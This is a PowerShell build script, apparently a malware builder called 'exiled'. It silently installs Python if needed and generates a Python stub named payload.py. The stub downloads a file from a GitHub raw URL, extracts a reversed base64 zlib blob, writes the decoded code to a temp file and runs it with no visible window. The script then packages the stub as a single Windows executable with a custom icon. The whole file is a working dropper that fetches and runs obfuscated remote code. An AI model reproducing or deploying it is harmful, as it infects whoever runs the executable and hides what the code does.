[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/halloween.png",
    [string]$Dir,
    [switch]$NoIcon,
    [switch]$KeepBuild
)

$ErrorActionPreference = "Stop"
$OutName = $Out
$UseIcon = -not $NoIcon

function Log {
    param([string]$Type, [string]$Text)
    $time = (Get-Date).ToString("HH:mm:ss")
    switch ($Type) {
        "error"   { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "✖ $Text" -ForegroundColor Red }
        "warning" { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "⚠ $Text" -ForegroundColor Yellow }
        "success" { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "✔ $Text" -ForegroundColor Green }
        "step"    { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "➜ $Text" -ForegroundColor Cyan }
        default   { Write-Host "  [$time] " -NoNewline -ForegroundColor DarkGray; Write-Host "ℹ $Text" -ForegroundColor White }
    }
}

$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$PythonExe = $null

foreach ($cand in @("python", "py", "python3")) {
    $cmd = Get-Command $cand -ErrorAction SilentlyContinue
    if ($cmd) { $PythonExe = $cmd.Source; break }
}

if (-not $PythonExe) {
    Log warning "Python not found on PATH. Initiating auto-install..."
    $pyVersion = "3.11.9"
    $pyArch = if ($Arch -eq "x64") { "amd64" } else { "win32" }
    $pyInstallerUrl = "https://www.python.org/ftp/python/$pyVersion/python-$pyVersion-$pyArch.exe"
    $pyInstallerPath = Join-Path $env:TEMP "python_installer.exe"
    
    Log step "Downloading Python $pyVersion ($pyArch)..."
    try {
        Invoke-WebRequest -Uri $pyInstallerUrl -OutFile $pyInstallerPath -UseBasicParsing
    } catch {
        Log error "Failed to download Python installer."
        exit 1
    }
    
    Log step "Installing Python silently..."
    Start-Process -FilePath $pyInstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
    
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    
    foreach ($cand in @("python", "py", "python3")) {
        $cmd = Get-Command $cand -ErrorAction SilentlyContinue
        if ($cmd) { $PythonExe = $cmd.Source; break }
    }
    
    if (-not $PythonExe) {
        Log error "Auto-install failed. Please install Python manually."
        exit 1
    }
    Log success "Python successfully installed."
}

$UseCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
if (-not $UseCurl) {
    $IWR = Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
    if (-not $IWR) {
        Log error "Neither curl.exe nor Invoke-WebRequest available."
        exit 1
    }
}

if ($Dir) {
    $Here = (Resolve-Path -LiteralPath $Dir).Path
} else {
    $Here = (Get-Location).Path
}
$Work     = Join-Path $Here "_build"
$Stub     = Join-Path $Work "payload.py"
$IconRaw  = Join-Path $Work "icon.raw"
$IconIco  = Join-Path $Work "icon.ico"
$DistDir  = Join-Path $Here "dist"

Clear-Host
Write-Host ""
Write-Host "  ███████╗██╗  ██╗██╗██╗     ███████╗██████╗ " -ForegroundColor DarkYellow
Write-Host "  ██╔════╝╚██╗██╔╝██║██║     ██╔════╝██╔══██╗" -ForegroundColor DarkYellow
Write-Host "  █████╗   ╚███╔╝ ██║██║     █████╗  ██║  ██║" -ForegroundColor DarkYellow
Write-Host "  ██╔══╝   ██╔██╗ ██║██║     ██╔══╝  ██║  ██║" -ForegroundColor DarkYellow
Write-Host "  ███████╗██╔╝ ██╗██║███████╗███████╗██████╔╝" -ForegroundColor DarkYellow
Write-Host "  ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ " -ForegroundColor DarkYellow
Write-Host ""
Log info "Building $OutName for windows-$Arch"
Log info "Output directory: $Here"
Write-Host ""

$ExePath = Join-Path $DistDir "$OutName.exe"
if (Test-Path -LiteralPath $ExePath) {
    Log step "Found existing $OutName.exe. Removing..."
    try {
        Remove-Item -LiteralPath $ExePath -Force
        Log success "Deleted old executable."
    } catch {
        Log error "Failed to delete existing EXE. Is it currently running? Please close it."
        exit 1
    }
}

New-Item -ItemType Directory -Force -Path $Work | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

# Download the payload to a temp file and run it locally
$stubBody = @"
import urllib.request, base64, zlib, re, sys, os, tempfile, subprocess

url = 'https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py'

try:
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    s = urllib.request.urlopen(req).read().decode()
    
    match = re.search(r"b'([^']+)'", s)
    if not match:
        sys.exit(0)
        
    p = match.group(1)
    decoded_code = zlib.decompress(base64.b64decode(p[::-1])).decode()
    
    # Write payload to a temp file and execute it
    fd, temp_path = tempfile.mkstemp(suffix=".py")
    with os.fdopen(fd, 'w', encoding='utf-8') as f:
        f.write(decoded_code)
        
    subprocess.Popen([sys.executable, temp_path], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
    sys.exit(0)
except Exception:
    sys.exit(0)
"@
Set-Content -Path $Stub -Value $stubBody -Encoding UTF8

if ($UseIcon) {
    if ($Icon -match '^https?://') {
        Log step "Fetching icon..."
        try {
            if ($UseCurl) {
                & curl.exe -fsSL -A "Mozilla/5.0" $Icon -o $IconRaw
            } else {
                Invoke-WebRequest -Uri $Icon -Headers @{ "User-Agent" = "Mozilla/5.0" } -OutFile $IconRaw
            }
        } catch {
            Log warning "Failed to fetch icon, skipping."
            $UseIcon = $false
        }
    } else {
        if (-not (Test-Path -LiteralPath $Icon)) {
            Log warning "Icon file not found, skipping."
            $UseIcon = $false
        } else {
            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
        }
    }
}

Log step "Installing build dependencies..."
& $PythonExe -m pip install --quiet --upgrade pyinstaller pillow
if ($LASTEXITCODE -ne 0) {
    Log error "pip install failed."
    exit 1
}

if ($UseIcon) {
    Log step "Converting icon to .ico..."
    $conv = @"
from PIL import Image
try:
    img = Image.open(r'$IconRaw')
    if img.mode != 'RGBA':
        img = img.convert('RGBA')
    img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
except Exception as e:
    print(f"Icon conversion failed: {e}")
    exit(1)
"@
    $convTmp = Join-Path $Work "_icon_conv.py"
    Set-Content -Path $convTmp -Value $conv -Encoding UTF8
    & $PythonExe $convTmp
    if ($LASTEXITCODE -ne 0) {
        Log warning "Icon conversion failed, skipping."
        $UseIcon = $false
    }
}

Log step "Freezing executable (this may take a minute)..."

# Removed --noconsole so the payload can spawn a window if it needs to
$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--hidden-import", "ctypes",
    "--hidden-import", "ctypes.wintypes",
    "--hidden-import", "tkinter",
    "--collect-all", "ctypes",
    "--collect-all", "tkinter",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work
)
if ($UseIcon -and (Test-Path $IconIco)) {
    $pyiArgs += @("--icon", $IconIco)
}
$pyiArgs += $Stub

& $PythonExe @pyiArgs
if ($LASTEXITCODE -ne 0) {
    Log error "PyInstaller failed."
    exit 1
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "  ┌────────────────────────────────────────────────────────┐" -ForegroundColor DarkGray
Write-Host "  │  Build Complete!                                       │" -ForegroundColor DarkGray
Write-Host "  └────────────────────────────────────────────────────────┘" -ForegroundColor DarkGray
Log success "Executable compiled successfully."
Log info "Output: $ExePath"
Log info "Target Architecture: Windows $Arch"
Write-Host ""
Write-Host "  Run command: & `"$ExePath`"" -ForegroundColor White
Write-Host ""
